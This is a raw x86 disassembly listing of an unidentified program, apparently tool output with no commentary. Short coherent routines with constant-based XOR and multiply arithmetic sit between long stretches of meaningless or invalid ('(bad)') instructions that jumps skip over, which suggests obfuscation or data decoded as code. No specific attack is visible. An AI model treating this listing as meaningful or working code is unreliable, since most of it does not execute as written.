  4059b7:	mov    esp,0x1c740260
  4059bc:	rcl    bl,1
  4059be:	es xor eax,0xb5149ace
  4059c4:	je     0x4059f0
  4059c6:	sub    ecx,DWORD PTR [esi]
  4059c8:	shl    BYTE PTR [ebx],cl
  4059ca:	push   ds
  4059cb:	into   
  4059cc:	mov    al,0x25
  4059ce:	mov    al,0xba
  4059d0:	mov    eax,ds:0x2f39e9c9
  4059d5:	in     eax,dx
  4059d6:	pop    es
  4059d7:	test   eax,0x87b516f9
  4059dc:	mov    eax,0xeaa694a5
  4059e1:	in     eax,dx
  4059e2:	sub    esp,DWORD PTR [edx+0x2f2b1827]
  4059e8:	xchg   ebx,eax
  4059e9:	out    dx,al
  4059ea:	mov    dl,0xc8
  4059ec:	in     eax,dx
  4059ed:	inc    ecx
  4059ee:	icebp  
  4059ef:	in     al,dx
  4059f0:	jbe    0x4059f7
  4059f2:	jb     0x405a2f
  4059f4:	stos   DWORD PTR es:[edi],eax
  4059f5:	jnp    0x405982
  4059f7:	cld    
  4059f8:	mov    ds:0x9680b8b,eax
  4059fd:	adc    esi,DWORD PTR ds:0x73c1a979
  405a03:	mov    ebp,0xbeda6939
  405a08:	add    al,0xc8
  405a0a:	in     eax,dx
  405a0b:	fld    TBYTE PTR [ebx-0x1a]
  405a0e:	mov    al,BYTE PTR [ebp-0x36e9a1fc]
  405a14:	scas   eax,DWORD PTR es:[edi]
  405a15:	repz cli 
  405a17:	stc    
  405a18:	ins    DWORD PTR es:[edi],dx
  405a19:	pop    ss
  405a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a1b:	sub    ah,BYTE PTR [ecx+0x5f]
  405a1e:	gs mov dl,0xfb
  405a21:	fild   DWORD PTR [eax+ebx*2-0x9db09e2]
  405a28:	cmc    
  405a29:	pusha  
  405a2a:	test   eax,0xd53e0ed4
  405a2f:	push   es
  405a30:	sbb    BYTE PTR [eax+edx*8],0x84
  405a34:	inc    esp
  405a35:	dec    edx
  405a36:	adc    al,0xca
  405a38:	or     al,BYTE PTR [esi]
  405a3a:	inc    ebp
  405a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a3c:	jl     0x4059d3
  405a3e:	xchg   edi,eax
  405a3f:	in     al,dx
  405a40:	retf   
  405a41:	mov    esp,DWORD PTR [ebx-0x2f]
  405a44:	lds    ecx,FWORD PTR [esi-0x15bff159]
  405a4a:	mov    eax,ds:0xeb5dcf2d
  405a4f:	loope  0x405a18
  405a51:	inc    ebp
  405a52:	clc    
  405a53:	xor    DWORD PTR [ebp-0x1d7e0764],eax
  405a59:	jnp    0x405ad4
  405a5b:	add    BYTE PTR [eax],al
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fe05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fdf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fdf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fdf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fdf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fdf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e3db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fdd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fdd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fdd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e637
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fdd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fdd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fdd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e7f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0x6876624d
  405b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b89:	pop    ss
  405b8a:	test   BYTE PTR [edx],dh
  405b8c:	jo     0x405bfe
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405c0f
  405b93:	neg    dh
  405b95:	push   esp
  405b96:	shr    DWORD PTR [esi+0x8],1
  405b99:	cli    
  405b9a:	jge    0x405b51
  405b9c:	pop    ds
  405b9d:	popa   
  405b9e:	push   esp
  405b9f:	(bad)  
  405ba0:	aaa    
  405ba1:	fstp   TBYTE PTR [ebx+0x349595fa]
  405ba7:	ins    DWORD PTR es:[edi],dx
  405ba8:	mov    ecx,0xc24f036
  405bad:	out    dx,al
  405bae:	leave  
  405baf:	push   ebx
  405bb0:	jl     0x405baf
  405bb2:	jbe    0x405ba1
  405bb4:	lods   al,BYTE PTR ds:[esi]
  405bb5:	in     al,0x37
  405bb7:	pop    esp
  405bb8:	sbb    DWORD PTR [edx-0x69],ebp
  405bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bbc:	retf   0xe0a
  405bbf:	mov    bh,dh
  405bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bc2:	test   al,0x34
  405bc4:	imul   ebx,DWORD PTR fs:[ebp-0x9],0xffffff8b
  405bc9:	sub    eax,0xb9a1b93a
  405bce:	mov    WORD PTR [edx+ecx*2-0x6048f829],fs
  405bd5:	push   ecx
  405bd6:	mov    ah,0xd0
  405bd8:	loopne 0x405be0
  405bda:	out    0xb2,eax
  405bdc:	sbb    bh,cl
  405bde:	pop    edi
  405bdf:	idiv   BYTE PTR [edx+0xc]
  405be2:	and    DWORD PTR [ebp+0x2961e10d],edi
  405be8:	sub    al,0x6c
  405bea:	xchg   ecx,eax
  405beb:	cmp    DWORD PTR [edi+edi*8+0x5a],esi
  405bef:	cmp    al,0x7c
  405bf1:	push   0x67
  405bf3:	jg     0x405c14
  405bf5:	dec    edx
  405bf6:	sbb    ch,bh
  405bf8:	(bad)  
  405bf9:	aad    0x15
  405bfb:	jp     0x405bbf
  405bfd:	dec    ecx
  405bfe:	mov    eax,ds:0x46c0c5e8
  405c03:	or     DWORD PTR [ebx-0x32794030],esp
  405c09:	xor    DWORD PTR [esi],ebp
  405c0b:	cmp    DWORD PTR [esi-0x367de1b6],ebx
  405c11:	stos   BYTE PTR es:[edi],al
  405c12:	xlat   BYTE PTR ds:[ebx]
  405c13:	cwde   
  405c14:	jmp    0xdbb3:0x51f0a8bf
  405c1b:	es (bad) 
  405c1e:	dec    DWORD PTR [edx+0x5c17b893]
  405c24:	sbb    eax,ebx
  405c26:	jno    0x405c81
  405c28:	cmc    
  405c29:	sub    eax,0x601d931b
  405c2e:	and    eax,0x4d67a430
  405c33:	push   cs
  405c34:	mov    BYTE PTR [edi+0x1d606c13],dh
  405c3a:	call   0x6130:0x244f2eee
  405c41:	retf   0x5546
  405c44:	push   0xffffffed
  405c46:	jne    0x405bdb
  405c48:	adc    BYTE PTR [ebp-0x7d],dh
  405c4b:	xor    edi,DWORD PTR ds:0x23142d6b
  405c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c52:	addr16 push edi
  405c54:	dec    edi
  405c55:	es mov ah,0x9d
  405c58:	mov    bl,0xd0
  405c5a:	adc    bl,BYTE PTR [ebx+0x4]
  405c5d:	or     DWORD PTR [ebp-0x4bc16c2c],edx
  405c63:	or     BYTE PTR [edi+0x61fe0992],cl
  405c69:	jge    0x405c65
  405c6b:	jp     0x405ccc
  405c6d:	jmp    0x419eb26c
  405c72:	in     eax,0x9
  405c74:	xchg   ebx,eax
  405c75:	pop    es
  405c76:	sub    DWORD PTR [edi],ecx
  405c78:	stos   BYTE PTR es:[edi],al
  405c79:	xchg   esi,eax
  405c7a:	push   cs
  405c7b:	push   edx
  405c7c:	sbb    BYTE PTR [edi+0x36],dh
  405c7f:	fdivr  st(0),st
  405c81:	fistp  DWORD PTR [edi+0x6d]
  405c84:	adc    DWORD PTR [eax],edx
  405c86:	mov    dl,0x62
  405c88:	out    dx,al
  405c89:	mov    WORD PTR [eax-0x70],ss
  405c8c:	cwde   
  405c8d:	cli    
  405c8e:	sub    DWORD PTR [ebx+esi*1+0xa],eax
  405c92:	mov    bl,0x9
  405c94:	mov    cl,0x92
  405c96:	dec    ebx
  405c97:	inc    ebx
  405c98:	mov    edi,0x67f98124
  405c9d:	xchg   esi,eax
  405c9e:	imul   ebp,DWORD PTR [ebx],0xa33c2842
  405ca4:	pop    ecx
  405ca5:	mov    eax,ds:0xd33e1d38
  405caa:	fs pop ebp
  405cac:	push   edi
  405cad:	and    bh,BYTE PTR [edi]
  405caf:	out    0x1d,eax
  405cb1:	leave  
  405cb2:	sub    al,0x8c
  405cb4:	popf   
  405cb5:	mov    ebx,0xee9745a6
  405cba:	sub    al,0x7d
  405cbc:	jmp    0xde83:0x383bc81c
  405cc3:	cmc    
  405cc4:	(bad)
  405cc7:	retf   
  405cc8:	sbb    esp,DWORD PTR [edi+0x33ae7ebf]
  405cce:	push   edi
  405ccf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cd0:	hlt    
  405cd1:	sbb    eax,0x827c9cea
  405cd6:	(bad)  
  405cd8:	mov    ah,0x71
  405cda:	push   ecx
  405cdb:	ror    DWORD PTR [edi],0x9b
  405cde:	gs pushf 
  405ce0:	dec    esp
  405ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ce2:	pop    ds
  405ce3:	mov    ecx,0x20f10c9
  405ce8:	mov    ch,0x4e
  405cea:	adc    DWORD PTR [ecx],ebp
  405cec:	pop    eax
  405ced:	hlt    
  405cee:	adc    DWORD PTR [esi+0x34],edx
  405cf1:	pusha  
  405cf2:	pop    edi
  405cf3:	cmc    
  405cf4:	ss addr16 push edx
  405cf7:	(bad)  
  405cf8:	adc    ebx,DWORD PTR [ebx-0x672df621]
  405cfe:	mov    al,0x55
  405d00:	mov    ecx,0x8d6b43ef
  405d05:	adc    DWORD PTR [edx+eiz*1+0x6c],0x3d
  405d0a:	mov    dh,0xd1
  405d0c:	(bad)  
  405d0e:	cld    
  405d0f:	mov    edx,0xd353651e
  405d14:	imul   ebx,DWORD PTR [esi],0x15
  405d17:	imul   ebx,DWORD PTR [edx+0x69],0x1b
  405d1b:	fst    QWORD PTR [ecx-0x46]
  405d1e:	mov    eax,ds:0x6b3c0ea3
  405d23:	gs or  dl,ch
  405d26:	cmp    ecx,DWORD PTR [ebx]
  405d28:	popf   
  405d29:	cmp    eax,DWORD PTR [esi]
  405d2b:	inc    eax
  405d2c:	(bad)  [esi+0x62615fae]
  405d32:	push   esp
  405d33:	(bad)  
  405d34:	ss xchg edi,eax
  405d36:	mov    dl,0xa
  405d38:	fist   DWORD PTR [ebx+0x7]
  405d3b:	or     al,BYTE PTR [ecx-0x24968d5b]
  405d41:	and    bh,BYTE PTR [edi]
  405d43:	push   0xbffd04e4
  405d48:	sub    BYTE PTR [eax],0x2a
  405d4b:	jae    0x405d23
  405d4d:	inc    eax
  405d4e:	xor    eax,eax
  405d50:	cmp    DWORD PTR [edx-0x3e],edx
  405d53:	mov    BYTE PTR [edi-0x1d95f18c],bh
  405d59:	jg     0x405ce0
  405d5b:	aad    0x4a
  405d5d:	pop    esi
  405d5e:	leave  
  405d5f:	cli    
  405d60:	push   ebp
  405d61:	and    edi,edi
  405d63:	call   0x27da:0xcb162340
  405d6a:	xor    al,0xf9
  405d6c:	xchg   ebx,eax
  405d6d:	repz dec ecx
  405d6f:	add    ebx,DWORD PTR [ebx+ebx*4-0x784e6990]
  405d76:	add    ch,BYTE PTR [ebx-0x73766bbd]
  405d7c:	mov    eax,ds:0x3b497076
  405d81:	cmp    cl,BYTE PTR [ecx]
  405d83:	jecxz  0x405d1d
  405d85:	sti    
  405d86:	je     0x405d86
  405d88:	add    eax,0x13c2da57
  405d8d:	sub    DWORD PTR [ecx],0x2600b9e6
  405d93:	lods   al,BYTE PTR ds:[esi]
  405d94:	shl    BYTE PTR [edx+0x4d],0x19
  405d98:	fmul   DWORD PTR [ecx-0x47]
  405d9b:	std    
  405d9c:	sub    eax,0x8d672d1
  405da1:	pop    esp
  405da2:	in     al,0x98
  405da4:	inc    sp
  405da6:	sbb    edx,edx
  405da8:	fld    DWORD PTR [esi+0x5c]
  405dab:	xchg   ebp,ebx
  405dad:	das    
  405dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405daf:	pop    ebp
  405db0:	iret   
  405db1:	in     eax,0x4
  405db3:	test   al,0x3
  405db5:	(bad)  
  405db7:	add    ch,BYTE PTR [edx]
  405db9:	mov    dh,dh
  405dbb:	dec    esi
  405dbc:	sub    DWORD PTR [ebx+ebx*2-0x2dccea16],edx
  405dc3:	adc    DWORD PTR [ecx+0x38],edi
  405dc6:	xchg   ebx,eax
  405dc7:	dec    ebx
  405dc8:	out    0x4a,al
  405dca:	jl     0x405dd4
  405dcc:	jg     0x405d67
  405dce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dcf:	test   bl,ch
  405dd1:	inc    eax
  405dd2:	jb     0x405e22
  405dd4:	dec    esi
  405dd5:	rcr    DWORD PTR [esp+eiz*8],cl
  405dd8:	test   dl,dl
  405dda:	sbb    al,0x6a
  405ddc:	out    dx,eax
  405ddd:	dec    ecx
  405dde:	retf   0xaa53
  405de1:	or     al,0x90
  405de3:	mov    cl,0xaf
  405de5:	dec    edx
  405de6:	je     0x405e32
  405de8:	sbb    bl,BYTE PTR ds:0x37fc1b22
  405dee:	loope  0x405d8c
  405df0:	xor    esi,DWORD PTR [ecx+0x2c]
  405df3:	or     al,0xc4
  405df5:	ins    DWORD PTR es:[edi],dx
  405df6:	ins    BYTE PTR es:[edi],dx
  405df7:	mov    bl,0xb0
  405df9:	dec    esi
  405dfa:	or     al,ah
  405dfc:	retf   
  405dfd:	dec    esi
  405dfe:	(bad)  
  405dff:	test   DWORD PTR [ecx],0xcd1d87e2
  405e05:	cmp    BYTE PTR [edx],0x1
  405e08:	adc    eax,0xdf2c9fac
  405e0d:	dec    eax
  405e0e:	xchg   ebx,eax
  405e0f:	fs scas al,BYTE PTR es:[edi]
  405e11:	cmp    al,ah
  405e13:	push   0x7e
  405e15:	adc    eax,0x14861839
  405e1a:	aad    0x94
  405e1c:	jge    0x405e59
  405e1e:	rcl    BYTE PTR [ecx-0xe35bc22],cl
  405e24:	xor    BYTE PTR [eax+edi*4-0x720d0103],bl
  405e2b:	pop    edx
  405e2c:	mov    ch,0xe
  405e2e:	xor    esi,DWORD PTR [edi]
  405e30:	jbe    0x405de9
  405e32:	push   cs
  405e33:	mov    ecx,0x23f78450
  405e38:	call   0x8a53866b
  405e3d:	mul    ecx
  405e3f:	retf   
  405e40:	dec    esi
  405e41:	outs   dx,DWORD PTR ds:[esi]
  405e42:	fstp   QWORD PTR [ebp+eax*8+0x4e]
  405e46:	mov    es,WORD PTR [ebp+0x33]
  405e49:	ret    0xc103
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e80f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e7ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fe01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0xe6
  405ea8:	das    
  405ea9:	mov    dl,0x92
  405eab:	ds aas 
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405ecf
  405eb4:	sbb    eax,0x5d9d9e04
  405eb9:	cmc    
  405eba:	push   ebx
  405ebb:	xlat   BYTE PTR ds:[ebx]
  405ebc:	daa    
  405ebd:	int    0x68
  405ebf:	dec    edi
  405ec0:	pop    es
  405ec1:	je     0x405ee1
  405ec3:	jl     0x405f13
  405ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ec6:	and    cl,BYTE PTR [ecx]
  405ec8:	xor    eax,0x54f3ecd6
  405ecd:	sbb    al,0x6a
  405ecf:	and    eax,0x3170a454
  405ed4:	xor    bh,dh
  405ed6:	jno    0x405f02
  405ed8:	aad    0xa2
  405eda:	adc    eax,0xb9149cab
  405edf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ee1:	add    DWORD PTR [ebx+eiz*4+0x2c7f87d2],ecx
  405ee8:	inc    eax
  405ee9:	mov    al,ds:0xc2f215cb
  405eee:	dec    BYTE PTR [ebx]
  405ef0:	jle    0x405e77
  405ef2:	ins    BYTE PTR es:[edi],dx
  405ef3:	arpl   WORD PTR [ecx],si
  405ef5:	mov    ecx,DWORD PTR [eax]
  405ef7:	cmp    al,0x9
  405ef9:	mov    ah,0x75
  405efb:	aaa    
  405efc:	jbe    0x405e92
  405efe:	(bad)  
  405eff:	xchg   edi,eax
  405f00:	lds    edx,FWORD PTR [esi+ecx*4+0x4db63b5f]
  405f07:	ret    0xc6d
  405f0a:	cmp    al,0xce
  405f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f0d:	jl     0x405eba
  405f0f:	int3   
  405f10:	data16 fstp DWORD PTR [edi]
  405f13:	jns    0x405f09
  405f15:	addr16 mov bl,0x63
  405f18:	sub    dh,BYTE PTR [eax+0x26]
  405f1b:	mov    ecx,0xcbbb43af
  405f20:	mov    eax,ds:0xa0d961d3
  405f25:	mov    bl,0xf5
  405f27:	inc    eax
  405f28:	imul   edi,DWORD PTR [eax-0x10],0x21
  405f2c:	(bad)  
  405f2d:	jbe    0x405f84
  405f2f:	cmp    al,0x14
  405f31:	mov    cl,0xb1
  405f33:	das    
  405f34:	jne    0x405f07
  405f36:	jle    0x405ee2
  405f38:	sbb    BYTE PTR [ecx-0x142adc6e],bl
  405f3e:	xor    eax,0xe1844cd1
  405f43:	loope  0x405f8a
  405f45:	jns    0x405f9e
  405f47:	std    
  405f48:	out    dx,al
  405f49:	mov    DWORD PTR [esi-0x3918a281],0xc78b3554
  405f53:	fisubr WORD PTR es:[edx+0x40]
  405f57:	ret    
  405f58:	int3   
  405f59:	mov    bl,0xa6
  405f5b:	mov    eax,0xd90d958b
  405f60:	outs   dx,BYTE PTR ds:[esi]
  405f61:	dec    esi
  405f62:	(bad)
  405f66:	lds    esi,FWORD PTR [edi+eiz*4]
  405f69:	sbb    DWORD PTR [ecx+0x3],esi
  405f6c:	pop    fs
  405f6e:	aad    0x9e
  405f70:	jns    0x405f6c
  405f72:	loop   0x405fa1
  405f74:	int3   
  405f75:	clc    
  405f76:	sbb    al,0x85
  405f78:	sbb    BYTE PTR [ebp+0x59781574],dl
  405f7e:	mov    eax,ds:0xf8c73941
  405f83:	fxch   st(0)
  405f85:	jl     0x405fdf
  405f87:	push   esp
  405f88:	cs pop esp
  405f8a:	or     bh,0x28
  405f8d:	stc    
  405f8e:	mov    BYTE PTR [ebx],dl
  405f90:	(bad)  
  405f92:	cld    
  405f93:	daa    
  405f94:	fadd   DWORD PTR [edi]
  405f96:	cli    
  405f97:	fimul  DWORD PTR [esi+0x704513f8]
  405f9d:	jmp    DWORD PTR [ebp-0x5290666e]
  405fa3:	inc    edi
  405fa4:	cmp    al,0xa1
  405fa6:	call   0xc4eb:0x22ab0496
  405fad:	pop    es
  405fae:	and    eax,0x8356bce9
  405fb3:	fiadd  WORD PTR cs:[eax+0x10]
  405fb7:	xchg   ecx,eax
  405fb8:	mov    eax,0xe7d30521
  405fbd:	mov    ch,0xba
  405fbf:	sbb    eax,0x3ee58
  405fc4:	or     esi,esp
  405fc6:	push   0xaaf53afe
  405fcb:	(bad)  
  405fcc:	mov    esi,0xdef282af
  405fd1:	add    ah,BYTE PTR [esi+0x1aa3f032]
  405fd7:	inc    ecx
  405fd8:	repz popf 
  405fda:	loope  0x405f7a
  405fdc:	cmp    dh,0x9a
  405fdf:	xor    ebp,ecx
  405fe1:	adc    ah,BYTE PTR [esp]
  405fe4:	xchg   edi,eax
  405fe5:	pop    esi
  405fe6:	enter  0x63a8,0xba
  405fea:	mov    cl,0xa4
  405fec:	in     al,dx
  405fed:	leave  
  405fee:	sub    DWORD PTR [edi],esi
  405ff0:	cdq    
  405ff1:	dec    ebx
  405ff2:	lods   al,BYTE PTR ds:[esi]
  405ff3:	xor    eax,0x6230bf81
  405ff8:	(bad)  
  405ff9:	sub    cl,ah
  405ffb:	xor    eax,edi
  405ffd:	sub    eax,0x7046578c
  406002:	dec    eax
  406003:	int    0x70
  406005:	imul   esi,DWORD PTR [edi],0xa
  406008:	inc    edi
  406009:	clc    
  40600a:	push   ds
  40600b:	adc    dh,BYTE PTR [ebp+0x75]
  40600e:	pushf  
  40600f:	push   ecx
  406010:	not    esp
  406012:	sahf   
  406013:	(bad)  
  406014:	jmp    0x37d0:0x5c31be78
  40601b:	add    DWORD PTR [esi],esp
  40601d:	sbb    al,cl
  40601f:	push   edi
  406020:	in     al,dx
  406021:	fldcw  WORD PTR [edi+0x15750dd1]
  406027:	adc    eax,0xdacad35a
  40602c:	inc    BYTE PTR [ebx-0x3c8fe3b6]
  406032:	inc    ax
  406034:	mov    bh,0xc5
  406036:	nop
  406037:	push   es
  406038:	(bad)  
  406039:	dec    ebx
  40603a:	mov    dl,ch
  40603c:	dec    ebp
  40603d:	jecxz  0x405fc4
  40603f:	sbb    eax,0x86e4da2e
  406044:	inc    esi
  406045:	mov    BYTE PTR [ebp-0x171703c0],dh
  40604b:	xor    DWORD PTR ds:0x36745f6c,esp
  406051:	jae    0x4060ad
  406053:	pmulhw mm4,QWORD PTR [edi-0x39]
  406057:	mov    ecx,0xfd86bec4
  40605c:	add    eax,0x32729c
  406061:	or     DWORD PTR ds:0x42fe86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e218
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fe76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fdf1,0x42e21c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fdd1,0x42e7fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fe82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fdd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fe05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xc8555196
  4060dc:	hlt    
  4060dd:	gs ds jo 0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x40615b
  4060e6:	sub    DWORD PTR [ebx+esi*8],0xe48e0a79
  4060ed:	mov    ah,0x8c
  4060ef:	fistp  DWORD PTR [esp+edx*8-0x4730178b]
  4060f6:	nop
  4060f7:	push   esi
  4060f8:	rcr    DWORD PTR ss:[ecx+ebp*8-0x3b1eeb24],0x2a
  406101:	sub    ebx,esi
  406103:	iret   
  406104:	sbb    BYTE PTR [ebp+esi*1+0x4b18d12f],cl
  40610b:	fisub  DWORD PTR [edi-0x5f]
  40610e:	jp     0x40614d
  406110:	out    dx,al
  406111:	(bad)  
  406112:	mov    ebp,0xe20f47cb
  406117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406118:	inc    esi
  406119:	jb     0x40617d
  40611b:	xor    BYTE PTR [ebx+eiz*4+0x3e75fa4e],ah
  406122:	xchg   ecx,eax
  406123:	or     cl,al
  406125:	push   ebp
  406126:	fstp   DWORD PTR cs:[ebp-0x6d01dade]
  40612d:	jecxz  0x4060fd
  40612f:	mov    DWORD PTR [eax],ecx
  406131:	inc    eax
  406132:	jae    0x406179
  406134:	outs   dx,DWORD PTR ds:[esi]
  406135:	ins    BYTE PTR es:[edi],dx
  406136:	iret   
  406137:	lock jmp 0x4061ae
  40613a:	lock mov DWORD PTR [ebx-0x43bda7d0],ebx
  406141:	jp     0x4060e6
  406143:	sahf   
  406144:	jbe    0x4060cd
  406146:	or     ch,ch
  406148:	sbb    ebp,DWORD PTR [eax+0x2]
  40614b:	add    al,0xe5
  40614d:	add    ecx,DWORD PTR [ecx-0x57]
  406150:	lods   eax,DWORD PTR ds:[esi]
  406151:	std    
  406152:	js     0x406178
  406154:	popf   
  406155:	imul   esi,DWORD PTR [eax-0x30fb0229],0x57
  40615c:	arpl   di,di
  40615e:	(bad)  
  40615f:	sahf   
  406160:	or     al,0x13
  406162:	xchg   ebp,eax
  406163:	leave  
  406164:	xlat   BYTE PTR ds:[ebx]
  406165:	movsx  edx,WORD PTR [eax-0x18d045e8]
  40616c:	sbb    dl,BYTE PTR [edx]
  40616e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40616f:	adc    eax,0xffffffb4
  406172:	aam    0x23
  406174:	xchg   ebp,eax
  406175:	shl    BYTE PTR [ebp-0x2152a0ea],0x55
  40617c:	add    dh,BYTE PTR ds:0xf3919174
  406182:	out    0x14,al
  406184:	fimul  WORD PTR [edi+0x36]
  406187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406188:	mov    ebp,0x3bbe196b
  40618d:	out    dx,eax
  40618e:	xor    bh,BYTE PTR [eax]
  406190:	stos   DWORD PTR es:[edi],eax
  406191:	sub    DWORD PTR cs:[ecx],ebx
  406194:	lods   eax,DWORD PTR ds:[esi]
  406195:	jmp    0x120a:0x2636d9c5
  40619c:	sbb    ebx,edi
  40619e:	retf   0xfad5
  4061a1:	xchg   bh,ah
  4061a3:	lahf   
  4061a4:	enter  0xfb46,0xaf
  4061a8:	pop    ds
  4061a9:	cli    
  4061aa:	pop    ebx
  4061ab:	jns    0x406197
  4061ad:	lds    ebp,FWORD PTR [edi-0x15]
  4061b0:	push   esp
  4061b1:	(bad)  
  4061b2:	adc    eax,0xc88ea8be
  4061b7:	xchg   edx,eax
  4061b8:	jg     0x406142
  4061ba:	cld    
  4061bb:	(bad)  
  4061bc:	xor    al,BYTE PTR [ebx]
  4061be:	loope  0x4061fa
  4061c0:	dec    DWORD PTR [ebx-0x2a]
  4061c3:	mov    edx,0xb4dbb2ea
  4061c8:	xor    DWORD PTR [ebp-0x17],ecx
  4061cb:	pop    ecx
